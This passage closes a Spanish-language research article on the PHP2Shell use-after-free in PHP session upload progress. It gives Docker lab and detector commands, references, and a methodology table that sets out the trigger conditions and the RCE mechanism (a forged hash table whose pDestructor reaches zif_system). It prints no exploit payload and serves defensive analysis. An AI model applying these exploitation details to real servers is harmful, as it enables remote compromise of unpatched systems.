   la cadena descrita contra el código fuente y contra el comportamiento
   observado**, y no contra la altura de otros PoCs.

---

## Apéndice A — Reproducir el laboratorio

```bash
cd research/php2shell-lab

# --- Targets 1 y 2: vulnerable (8.2.34) y parcheado (8.2.35) -----------
docker build -t php2shell-vuln:8.2.34 .
sed 's/8\.2\.34/8.2.35/g' Dockerfile > Dockerfile.patched
docker build -f Dockerfile.patched -t php2shell-patched:8.2.35 .

./lab.sh          # levanta ambos en 8080 (vulnerable) y 8081 (parcheado)

# Test diferencial vulnerable/parcheado
python3 behavioural_diff.py 127.0.0.1 8080 "VULNERABLE"
python3 behavioural_diff.py 127.0.0.1 8081 "PARCHEADO"

# --- Target 3: PHP con símbolos + ASLR off, para análisis de bajo nivel ---
# (compila PHP 8.2.34 desde el código fuente; tarda ~5 minutos)
docker build -f Dockerfile.rce -t php2shell-rce:8.2.34 .
./lab-rce.sh     # lo levanta en 8082

# Verificar la base de libphp.so y los offsets en runtime
curl -s http://127.0.0.1:8082/base.php

# --- Detector/verificador del UAF (con controles negativos) -------------
python3 php2shell_leak.py --host 127.0.0.1 --port 8082 --rounds 8 --controls
```

Salida esperada del detector contra el target vulnerable:

```
OOM confirmado:            8/8
Request B -> crash:        4
Request B -> stale SID:    4   ('Session ID is too long' = UAF leido)
Request B -> ok:           0
Control GET tras OOM:      {'ok': 4, 'crash': 0}
Control sin OOM:           {'ok': 4, 'crash': 0}
```

Y contra el target parcheado (8081), el mismo detector no debe observar
`crash` ni `stale_sid`: ese es el discriminante.

## Apéndice B — Referencias

- PHP Security Advisory — `GHSA-w8hw-w9fx-j79w` (CVE-2026-109618)
- PHP Security Advisory — `GHSA-6wmf-4rv5-p3rp` (CVE-2026-109619)
- Patch oficial `31c0ea7d7ff` — "Avoid state corruption via bailout" (Arnaud Le Blanc)
- Akamai Security Intelligence Group — "Understanding PHP2Shell: Everything You Need to Know"
- Akamai SIG — "Critical Remote Code Execution Vulnerabilities in PHP Core"
- JFrog Security Research — "PHP2Shell: All You Need to Know"
- Wiz — "PHP2Shell: PHP RCE" · Calif Security Lab — `calif.io/php2shell`
- CISA Alert — "Critical Vulnerabilities in PHP Require Immediate Patching" (21 oct 2026)
- CERT-EU — Advisory 2026-018
- Recorded Future — "PHP2Shell Exploitation: Two Critical PHP Flaws Explained"
- Vercel, Cisco, Laravel Forge, Autodesk, IC3 — boletines del 21-23 oct 2026

---

> **Nota de alcance:** todas las pruebas de este artículo se realizaron contra servidores locales en contenedores Docker aislados, sin exposición a Internet. El laboratorio, el detector y la PoC se publican con fines exclusivamente defensivos y de investigación de seguridad. Explotar sistemas de terceros sin autorización escrita explícita es ilegal en la mayoría de jurisdicciones.

---

## Apéndice C — Metodología y trazabilidad

### Qué se verificó de primera mano en este trabajo

| Afirmación | Cómo se comprobó |
|---|---|
| Ubicación exacta del UAF | Lectura directa de `ext/session/session.c` (líneas ~3090) y `ext/session/php_session.h` (línea 136) de PHP 8.2.34 |
| Layout de `zend_internal_function` | Programa C de comprobación de `offsetof` contra la definición real en `Zend/zend_compile.h` |
| `sizeof(zend_internal_function)` = 136 | Compilación y ejecución del programa de offsets |
| Comportamiento diferencial vulnerable/parcheado | Test ejecutado contra 8.2.34 y 8.2.35 reales en Docker, con salida capturada |
| Que el parche corta el handler | Lectura del parche oficial `31c0ea7d7ff` y contraste del comportamiento observado |
| Que `mod_upload_progress` es independiente del `upload_progress` de PHP | Búsqueda en `ext/session/*.c` y `*.h`: sin referencias cruzadas |
| Versiones parcheadas por rama | Anuncios oficiales de PHP y boletines de Akamai/JFrog/CISA |
| Que el OOM durante el parseo multipart aborta **antes** de RINIT | `php_request_startup()` en `main/main.c`: `php_hash_environment()` (parseo) precede a `zend_activate_modules()` (RINIT); confirmado además porque la respuesta del Request A no incluye salida del script |
| Que el trigger de OOM funciona con ~500 KB de cuerpo HTTP | Medición directa: 3 000 uploads anidados vacíos → `Allowed memory size of 33554432 bytes exhausted` con `memory_limit=32M` |
| Que el trigger requiere nombres de primer nivel distintos | Comparación A/B: con prefijo compartido no hay OOM; con nombres distintos sí |
| Que el UAF se dispara en el Request B | `signal 11` en el log del kernel + desensamblado del punto de fallo (`libphp.so+0x3b0750`, en `_emalloc`/`zend_mm_alloc_small`) |
| Que el Request B debe ir al mismo worker | Comparación de PIDs del worker antes/después de cada par de requests: idénticos en el 100 % de los casos |
| Que el fallo se manifiesta como corrupción del allocator de Zend MM | Desensamblado del sitio de crash: la lectura de `bin->slots[]` sigue un puntero de página no mapeada (`RCX=0x7ffff745520000`) |
| Que el parche oficial corta el camino de OOM | Lectura del hunk de `ext/session/session.c` en `31c0ea7d7ff`: `PS(in_rfc1867_update)`, `php_rinit_session_globals()` en `MULTIPART_EVENT_START` e `if (PG(modules_activated)) return retval;` |
| Que la inyección en el fichero de sesión es posible | El `filename` del upload se almacena literal en el fichero de sesión (verificado leyendo `/tmp/sess_*`) |
| Que el mecanismo de RCE real usa una tabla hash con `pDestructor`, no una `zend_internal_function` | Lectura del código fuente de PHP (`zend_array_destroy` invoca `pDestructor` con un `zval*`, que es la firma de `zif_system`) y contraste con los PoC públicos funcionales |
| Que el crash **no depende** del `PHPSESSID` del Request B | Control A/B: Request B con SID idéntico (crash 4/4) vs SID distinto (crash 4/4) |
| Que el campo `PHP_SESSION_UPLOAD_PROGRESS` en el Request B es **imprescindible** | Control A/B: Request B sin ese campo → crash 0/4 |
| Que el OOM es **necesario y suficiente** | Control A/B: Request B con `upload_progress` pero sin OOM previo → crash 0/4; con OOM → crash 4/4 |
| Que el OOM **no** corrompe el worker de forma general | Control: Request B normal (GET) tras el OOM → 4/4 respuestas correctas |
| Que el worker sobrevive al OOM y muere en el Request B | Log de Apache: el SIGSEGV corresponde al PID del worker **después** del OOM, no durante |
| Que el `filename` se serializa literal en el fichero de sesión | Lectura directa de `/tmp/sess_*`: `s:4:"name";s:5:"a.txt";` con longitudes explícitas |
| Que el `filename` **no** transporta bytes arbitrarios por HTTP | Prueba directa: `A\x00B\xffC\x01D` llega al script como `x01D` (saneado por PHP) |
| Que la longitud del `zend_string` del filename es controlable | `$_FILES['name']` refleja exactamente 16, 64 y 200 bytes |
| Que el punto de fallo está en `zend_mm_alloc_small` siguiendo una lista de libres corrupta | Desensamblado de `libphp.so+0x3b0750` y desensamblado de `Zend/zend_alloc.c` (`bin_data_size`, `bin->slots[]`) |
| Que **OPcache** cambia la expresión del UAF | A/B sobre el **mismo binario oficial**: con OPcache 0/6, sin OPcache 6/6 (el único cambio fue borrar `docker-php-ext-opcache.ini`) |
| Que ASLR no es la variable determinante | El mismo target de laboratorio con ASLR ON (base `0x7957e39c0000`) también dio 6/6, igual que con ASLR OFF |
| Que el número de workers de Apache es determinante | Con 5 workers (default de la imagen oficial) el Request B va a un proceso distinto y el UAF no se observa; con `MaxRequestWorkers 1` se observa 6/6 |
| Que `session.upload_progress.cleanup=On` es obligatorio para la rama UAF | Control A/B: con `cleanup=Off` el camino `php_session_rfc1867_cleanup()` no se ejecuta (0/4 crashes) |
| Que `max_multipart_body_parts` y `max_file_uploads` bloquean el trigger | Observación directa: con el límite activo aparece "Multipart body parts limit exceeded" y el OOM nunca se dispara; con `max_file_uploads=20` (default) el heap nunca se agota |
| Que PHP 8.2.35 impone un límite interno de 2000 partes multipart | Mensaje del servidor: "Multipart body parts limit exceeded 2000" |
| Que el parche oficial **elimina el OOM** en lugar de solo corregir la corrupción | Con 1500 partes, 8.2.35 no agota la memoria (0/6) mientras 8.2.34 sí (6/6) |

### Qué procede del análisis público y no se reprodujo aquí

- La **exfiltración de memoria** (leak) por `php_url_encode(ZSTR_VAL(PS(id)), ZSTR_LEN(PS(id)))`
  requiere un *grooming* del heap que en este laboratorio no se logró: en el
  Request B, el puntero colgante apunta a memoria no mapeada (crash) o es
  detectado como inválido (fallo limpio de `php_session_initialize()`).
- La **RCE completa** requiere además resolver la dirección base de `libphp.so`
  en runtime —o usar la fuga de ASLR purely-HTTP descrita en los writeups— y
  colocar la tabla hash falsificada en el slot exacto.
- Las cifras del spray (149 × 288) proceden del análisis de Akamai. El layout de
  la struct se contrastó de forma independiente contra el código fuente.
- La cadena de fuga de ASLR en 4 etapas (chunk base → base de `libphp` →
  `zif_system` → forja de la tabla) está documentada en los PoC públicos
  citados; no se reimplementó aquí.

### Nota sobre PoC públicos: dos fuentes de riesgo

1. **Cargas maliciosas falsas.** Durante la investigación se observó que
   algunos repositorios de PoC publicados para estas CVEs **distribuyen cargas
   maliciosas falsas** (JFrog documenta al menos un caso: un script que solo
   cambiaba el fondo de pantalla del sistema). Antes de ejecutar cualquier PoC
   de terceros, auditarlo línea a línea.
2. **Posibles fixtures obsoletos.** Parte de este trabajo se apoyó en PoC
   públicos; sus artefactos pueden contener fixtures que no corresponden al
   mecanismo real. Las primitivas descritas en este artículo se verificaron de
   forma **independiente** contra el código fuente y contra el comportamiento
   observado en el laboratorio; ninguna afirmación se apoya únicamente en un
   PoC de terceros.
